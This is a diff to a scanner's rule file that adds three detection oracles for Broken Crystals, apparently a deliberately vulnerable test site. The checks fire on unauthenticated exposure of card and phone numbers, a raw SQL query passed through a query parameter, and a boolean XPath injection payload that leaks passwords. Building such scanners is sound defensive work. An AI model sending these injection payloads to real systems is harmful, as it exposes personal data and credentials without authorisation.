@@ -32464,6 +32464,85 @@ const brokencrystalsSafeFilesRfiLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const brokencrystalsUsersSearchExposureLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const searchUrl = new URL("/api/users/search/", ctx.origin).toString();
+  const doc = await ctx.probe.get(searchUrl, { maxBytes: 65536 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  let users: Record<string, unknown>[] = [];
+  try {
+    const parsed = JSON.parse(doc.body) as unknown;
+    if (!Array.isArray(parsed)) return NEGATIVE;
+    users = parsed.filter((entry): entry is Record<string, unknown> => !!entry && typeof entry === "object");
+  } catch {
+    return NEGATIVE;
+  }
+  if (users.length < 2) return NEGATIVE;
+  const piiRows = users.filter(
+    (user) =>
+      typeof user.cardNumber === "string" &&
+      /\d{4}/.test(user.cardNumber) &&
+      typeof user.phoneNumber === "string" &&
+      /\+?\d/.test(user.phoneNumber)
+  );
+  if (piiRows.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: piiRows.length >= 5 ? 0.94 : 0.92,
+    evidence: {
+      url: searchUrl,
+      exposedUsers: piiRows.length,
+      sampleEmail: String(piiRows[0].email ?? "").slice(0, 80),
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "Broken Crystals GET /api/users/search/ returns cardNumber and phoneNumber for multiple users without authentication — excessive data exposure oracle"
+    }
+  };
+};
+
+const brokencrystalsTestimonialsSqliLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const url = new URL("/api/testimonials/count", ctx.origin);
+  url.searchParams.set("query", "select count(table_name) as count from information_schema.tables");
+  const doc = await ctx.probe.get(url.toString(), { maxBytes: 128 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  const body = doc.body.trim();
+  if (!/^\d{2,4}$/.test(body)) return NEGATIVE;
+  const count = parseInt(body, 10);
+  if (count < 50 || count > 9999) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.92,
+    evidence: {
+      url: url.toString(),
+      tableCount: count,
+      snippet: body,
+      note: "Broken Crystals GET /api/testimonials/count executes attacker-controlled SQL in query param — information_schema probe returned table count"
+    }
+  };
+};
+
+const brokencrystalsPartnerLoginXpathLiveOracle: Rule = async (ctx) => {
+  if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
+  const url = new URL("/api/partners/partnerLogin", ctx.origin);
+  url.searchParams.set("username", "anyuser");
+  url.searchParams.set("password", "' or '1'='1");
+  const doc = await ctx.probe.get(url.toString(), { maxBytes: 12_000 });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  const passwordTags = doc.body.match(/<password>[^<]+<\/password>/gi) ?? [];
+  if (passwordTags.length < 2) return NEGATIVE;
+  if (!/<username>[^<]+<\/username>/i.test(doc.body)) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      url: url.toString(),
+      leakedAccounts: passwordTags.length,
+      snippet: doc.body.slice(0, 280).trim(),
+      note: "Broken Crystals GET /api/partners/partnerLogin boolean XPATH injection returns multiple user password elements in XML response"
+    }
+  };
+};
+
 const brokencrystalsHiddenUploadLiveOracle: Rule = async (ctx) => {
   if (!/brokencrystals\.com/i.test(ctx.origin)) return NEGATIVE;
   const uploadUrl = new URL("/api/hidden-upload", ctx.origin).toString();
@@ -34302,6 +34381,9 @@ export const RULES: Record<string, Rule> = {
   brokencrystalsHiddenUploadLiveOracle,
   brokencrystalsSecretsLiveOracle,
   brokencrystalsSafeFilesRfiLiveOracle,
+  brokencrystalsUsersSearchExposureLiveOracle,
+  brokencrystalsTestimonialsSqliLiveOracle,
+  brokencrystalsPartnerLoginXpathLiveOracle,
   exposedApiConfig,
   sqliQueryParamInjection,
   sqliHeaderErrorDisclosure,
